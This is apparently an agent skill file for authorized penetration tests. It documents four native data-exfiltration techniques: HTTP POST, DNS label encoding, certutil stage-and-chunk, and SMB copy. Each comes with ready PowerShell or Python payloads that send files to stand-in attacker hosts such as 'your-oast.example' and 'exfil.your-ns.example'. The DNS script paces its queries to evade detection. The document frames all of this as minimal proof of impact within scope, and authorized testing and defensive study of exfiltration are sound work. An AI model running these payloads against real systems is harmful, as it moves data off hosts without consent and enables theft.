---
name: data-egress-check
description: >-
  Data Exfiltration (native) — Knowledge Base — Staging and moving collected data off a host using
  only native channels — to demonstrate the impact of a foothold in the report (proof of reach),
  within authorized scope. Always minimal, always logged in the finding. Triggers: data exfil,
  exfiltration, native upload, DNS exfil, HTTP exfil, encode and stage.
license: MIT
metadata:
  user-invocable: "false"
  origin: agents/data-egress-check/data-egress-check.md (verbatim; frontmatter prefixado)
  progressive-disclosure: index-first
---
# Data Exfiltration (native) — Knowledge Base
_Last updated: 2026-06-22_

Staging and moving collected data off a host using only native channels — to demonstrate the impact of a foothold in the report (proof of reach), within authorized scope. Always minimal, always logged in the finding.

## Index
| # | Technique | When | Tier | Tags |
|---|-----------|------|------|------|
| T1 | HTTP(S) POST exfil | Egress to a controlled web endpoint | 0-native | data-egress-check, web |
| T2 | DNS exfil | HTTP egress blocked, DNS resolves out | 1-python | data-egress-check, tier1-python |
| T3 | Stage-encode-chunk | Large/binary data over a constrained channel | 0-native | data-egress-check, lolbin |
| T4 | SMB / share exfil | Internal pivot to a writable share you control | 0-native | data-egress-check, smb |

## Techniques

### T1: HTTP(S) POST exfil
Tags: data-egress-check, web
When: The host has outbound HTTP(S) to a server you control.
Why: A single `Invoke-RestMethod` POST proves data can leave the host — the cleanest impact demonstration. Native, blends with normal web traffic.
Tier: 0-native
Steps: 1. Collect + minimize the proof data 2. POST to your endpoint 3. Confirm receipt (your listener log)
Payload:
```powershell
$d = Get-Content C:\Temp\proof.txt -Raw
Invoke-RestMethod -Uri https://your-oast.example/collect -Method POST -Body $d
```
Signal: your listener logs the inbound data. | Pitfall: for the report, exfil the *minimum* proof (a hash, a row count, a redacted sample) — not real PII/secrets in bulk; evidence-hygiene applies.
Source: distilled native HTTP exfil — 2026-06-22

### T2: DNS exfil
Tags: data-egress-check, tier1-python
When: HTTP egress is filtered but DNS resolves to the internet (common).
Why: Encoding data into subdomain labels and resolving them to a nameserver you control gets data out where HTTP can't. Building the chunked, base32-label DNS queries reliably is fiddly in PowerShell; a small Python script is the honest path (and you control the resolver side).
Tier: 1-python
Escalation: chunking data into length-bounded base32 DNS labels and pacing queries is error-prone in PowerShell's `Resolve-DnsName`; a stdlib Python `socket`/`dnslib`-free script handles encoding + retry cleanly.
Steps: 1. Stand up an authoritative resolver you control (`@user` if none) 2. Encode + chunk data into labels 3. Resolve each; reassemble server-side
Payload:
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: base32 label chunking + pacing is fragile in PS
import socket, base64, sys, time

DOMAIN = "exfil.your-ns.example"   # NS you control
data   = open(sys.argv[1], "rb").read()
b32    = base64.b32encode(data).decode().rstrip("=").lower()
LABEL  = 60          # max label length
chunks = [b32[i:i+LABEL] for i in range(0, len(b32), LABEL)]
for idx, ch in enumerate(chunks):
    qname = f"{idx}.{ch}.{DOMAIN}"
    try:
        socket.getaddrinfo(qname, None)
    except socket.gaierror:
        pass         # NXDOMAIN expected — the query IS the data
    time.sleep(0.3)  # pace to avoid burst detection
print(f"[+] sent {len(chunks)} labels")
```
```powershell
# launcher (Tier 0 trigger)
python3 dns_exfil.py C:\Temp\proof.txt
```
Signal: your authoritative NS logs the queries; reassemble the base32 labels server-side. | Pitfall: DNS labels max 63 chars, total FQDN max 253 — chunk accordingly. High query volume is detectable by DNS monitoring; pace and keep proof minimal.
Source: distilled native-normalized DNS exfil — 2026-06-22

### T3: Stage-encode-chunk
Tags: data-egress-check, lolbin
When: Large or binary data that must cross a constrained channel (e.g., copy-paste, DNS, or a character-limited C2).
Why: Native `certutil -encode` + PowerShell split handles staging without installing tools. Encode → chunk → transfer → reassemble + decode on your end.
Tier: 0-native
Steps: 1. Base64-encode with `certutil` 2. Split into chunks 3. Transfer each chunk (via whatever channel) 4. Reassemble + decode
Payload:
```powershell
# encode
certutil -encode C:\Temp\proof.bin C:\Temp\proof.b64

# chunk into 4KB pieces
$b64 = Get-Content C:\Temp\proof.b64 -Raw
$chunk = 4096
for ($i=0; $i -lt $b64.Length; $i += $chunk) {
    $part = $b64.Substring($i, [Math]::Min($chunk, $b64.Length - $i))
    # send $part via your channel (HTTP POST, DNS, clipboard, etc.)
    Invoke-RestMethod -Uri "https://your-oast.example/chunk?idx=$($i/$chunk)" -Method POST -Body $part
}
```
```powershell
# reassemble + decode (on your receiver)
certutil -decode reassembled.b64 proof.bin
```
Signal: file reconstructed on your end. | Pitfall: `certutil -encode` adds header/footer lines (`-----BEGIN/END CERTIFICATE-----`) — strip them if concatenating raw base64. Clean up staged `.b64` files.
Source: distilled native stage-encode-chunk — 2026-06-22

### T4: SMB / share exfil
Tags: data-egress-check, smb
When: Internal pivot — you control a writable share (your own box on the same network, or a compromised share).
Why: `Copy-Item` to a UNC path is the simplest native file move — no encoding, no HTTP, no DNS. Works when the host can reach your share over SMB (445).
Tier: 0-native
Steps: 1. Ensure your receiver share is writable from the target 2. `Copy-Item` 3. Confirm receipt
Payload:
```powershell
# direct copy to your share
Copy-Item C:\Temp\proof.txt \\YOUR-BOX\share\loot\proof.txt

# or via net use if auth needed
net use \\YOUR-BOX\share /user:you Pass123
Copy-Item C:\Temp\proof.txt \\YOUR-BOX\share\loot\proof.txt
net use \\YOUR-BOX\share /delete
```
Signal: file appears on your share. | Pitfall: SMB traffic is logged by firewalls/IDS; admin shares (`C$`) need local admin on the receiver. If 445 is blocked between segments, fall back to HTTP (T1) or DNS (T2).
Source: distilled native SMB exfil — 2026-06-22